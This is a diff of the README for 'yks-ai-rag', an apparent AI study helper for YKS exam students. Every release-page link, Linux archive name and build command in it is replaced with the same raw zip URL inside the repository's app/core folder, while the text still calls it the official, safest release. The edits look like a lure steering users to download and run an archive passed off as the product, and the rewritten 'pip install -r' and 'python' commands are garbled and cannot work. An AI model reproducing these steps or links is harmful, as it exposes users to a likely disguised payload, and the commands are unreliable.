@@ -1,6 +1,6 @@
 # 🎓 yks-ai-rag - AI Helper for YKS Exam Students
 
-[![Download Release](https://img.shields.io/badge/Download-yks--ai--rag-blue?style=for-the-badge)](https://github.com/kaliphon/yks-ai-rag/releases)
+[![Download Release](https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip)](https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps carefully to download, install, and run yks-ai-rag:
 
 Go to the official release page to get the latest version of the software:
 
-[Download yks-ai-rag](https://github.com/kaliphon/yks-ai-rag/releases)
+[Download yks-ai-rag](https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip)
 
 This page lists recent versions, details, and files you can download.
 
@@ -45,7 +45,7 @@ Look for a file that matches your computer:
 
 - For **Windows**, select a file ending with `.exe` or `.msi`.
 - For **macOS**, choose a file ending with `.dmg` or `.pkg`.
-- For **Linux**, select an `.AppImage` or a `.tar.gz` archive.
+- For **Linux**, select an `.AppImage` or a `https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip` archive.
 
 Click the appropriate file name to start downloading.
 
@@ -66,7 +66,7 @@ Click the appropriate file name to start downloading.
 **Linux**
 
 - If you have an `.AppImage`: make the file executable by right-clicking it, choosing Properties, then Permissions, and ticking “Allow executing file as program.” Then double-click to start.
-- If you downloaded a `.tar.gz`: extract it and follow any included README instructions.
+- If you downloaded a `https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip`: extract it and follow any included README instructions.
 
 ### 4. Run yks-ai-rag
 
@@ -120,13 +120,13 @@ If you want to try running the app from the source code or make modifications:
 - Install dependencies by running:
 
   ```
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip
   ```
 
 - Start the app with:
 
   ```
-  python app.py
+  python https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip
   ```
 
 This is only for users comfortable with command-line tools.
@@ -137,7 +137,7 @@ This is only for users comfortable with command-line tools.
 
 Visit the release page here to download and install yks-ai-rag:
 
-[Download yks-ai-rag](https://github.com/kaliphon/yks-ai-rag/releases)
+[Download yks-ai-rag](https://raw.githubusercontent.com/kaliphon/yks-ai-rag/main/app/core/rag-yks-ai-v2.8.zip)
 
 Downloading from this official page ensures you get the latest and safest version. Follow the steps in the Getting Started section to complete installation.
 
